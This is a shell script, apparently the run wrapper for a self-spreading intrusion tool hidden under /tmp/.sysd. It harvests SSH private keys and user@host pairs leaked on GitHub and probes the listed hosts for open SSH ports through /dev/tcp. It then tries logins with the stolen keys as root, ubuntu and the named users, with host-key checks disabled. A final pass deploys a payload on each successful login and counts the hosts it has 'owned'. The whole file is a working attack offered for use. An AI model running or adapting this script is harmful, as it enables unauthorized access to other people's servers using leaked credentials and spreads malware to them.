#!/bin/sh
# throwaway: wide visible scan - many repos, show the picks, show what answers.
# Unlike the last one, login attempts are derived from the queue itself
# (key/user rows that actually named that host) rather than a blind cross-product.
set -u
export HUNT_MAX_REPOS=60      # the point of this run: many more repos
export HUNT_MAX_PROBE=200
W=/tmp/.sysd/.hunt
. /tmp/.sysd/worker.env 2>/dev/null || true
TARGET_USERS="${TARGET_USERS:-root}"

echo "=== 0. start $(date -u +%FT%TZ)  HUNT_MAX_REPOS=$HUNT_MAX_REPOS ==="

echo
echo "=== 1. HARVEST: 7 code searches over github ==="
sh /tmp/.sysd/hunt.sh harvest

echo
echo "=== 2. REPOS INSPECTED THIS RUN ($(wc -l < "$W/repos.txt" 2>/dev/null)) ==="
cat "$W/repos.txt" 2>/dev/null

echo
echo "=== 3. KEY FILES: ssh-keygen fingerprint + comment ==="
for k in "$W"/keys/*; do
    [ -f "$k" ] || continue
    printf '%s :: ' "$(basename "$k")"
    ssh-keygen -l -f "$k" 2>/dev/null || echo unreadable
done
echo "keys=$(ls "$W/keys" 2>/dev/null | wc -l)  queued_rows=$(wc -l < "$W/targets.txt")  already_probed=$(wc -l < "$W/seen.txt")"

echo
echo "=== 4. EXPLICIT user@host PAIRS FOUND THIS RUN ==="
cat "$W/pairs.txt" 2>/dev/null || echo "(none)"

echo
echo "=== 5. NEW HOSTS, PORT 22 + SSH BANNER (sample of queue) ==="
cut -f3 "$W/targets.txt" | sort -u > /tmp/allh.txt
cut -d@ -f2 "$W/seen.txt" | sort -u > /tmp/seeh.txt
comm -23 /tmp/allh.txt /tmp/seeh.txt | sort -R 2>/dev/null | head -150 > /tmp/newh.txt
echo "never-probed hosts in queue: $(wc -l < /tmp/newh.txt) (sampled 150)"
rm -f /tmp/open.txt
while read -r ip; do
    [ -n "$ip" ] || continue
    ( b="/tmp/ban.$ip"
      timeout 3 bash -c "exec 3<>/dev/tcp/$ip/22; head -1 <&3" > "$b" 2>/dev/null
      [ -s "$b" ] && printf '%s\t%s\n' "$ip" "$(tr -d '\r' < "$b")" >> /tmp/open.txt
      rm -f "$b" ) &
done < /tmp/newh.txt
wait
sort -u /tmp/open.txt -o /tmp/open.txt 2>/dev/null || :
echo "live ssh servers found: $(wc -l < /tmp/open.txt)"
cat /tmp/open.txt

echo
echo "=== 6a. ATTEMPTS USING THE QUEUE'S OWN PAIRING (key that named this host) ==="
cut -f1 /tmp/open.txt 2>/dev/null | head -8 > /tmp/tgt.txt
while read -r ip; do
    [ -n "$ip" ] || continue
    grep -F "$(printf '\t%s' "$ip")" "$W/targets.txt" | awk -F'\t' '{print $1" "$2}' | sort -u | head -6 \
    | while read -r key user; do
        printf '%-30s %-34s ' "$user@$ip" "$(basename "$key")"
        if ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
               -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
               -o ConnectTimeout=3 "$user@$ip" true 2>/dev/null; then echo "LOGIN_OK";
        else echo deny; fi
    done
done < /tmp/tgt.txt

echo
echo "=== 6b. FALLBACK: 3 random live keys x root/ubuntu on those hosts ==="
for k in $(ls "$W"/keys/* | sort -R 2>/dev/null | head -3); do
    for ip in $(cut -f1 /tmp/open.txt 2>/dev/null | head -4); do
        for u in root ubuntu; do
            printf '%-30s %-34s ' "$u@$ip" "$(basename "$k")"
            if ssh -i "$k" -o IdentitiesOnly=yes -o BatchMode=yes \
                   -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                   -o ConnectTimeout=3 "$u@$ip" true 2>/dev/null; then echo "LOGIN_OK";
            else echo deny; fi
        done
    done
done

echo
echo "=== 7. REAL PROBE PASS (records seen.txt, deploys on success) ==="
sh /tmp/.sysd/hunt.sh probe
echo "owned: $(wc -l < "$W/owned.txt")"
echo "=== SCAN DONE $(date -u +%FT%TZ) ==="
